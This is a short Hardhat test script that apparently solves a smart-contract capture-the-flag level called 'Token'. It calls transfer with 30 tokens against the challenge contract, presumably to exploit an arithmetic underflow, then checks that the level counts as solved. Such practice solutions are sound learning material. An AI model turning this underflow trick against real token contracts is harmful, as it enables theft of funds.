import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let accomplice: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa, accomplice] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Token`);
    const challengeAddress = await createChallenge(
        `0xB4802b28895ec64406e45dB504149bfE79A38A57`
    );
    challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
    let tx = await challenge.transfer(
        "0xD76e3Eb0e172c9eD0D74d6a2d0b740A4922086B7",
        30
    );
    await tx.wait();
});

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
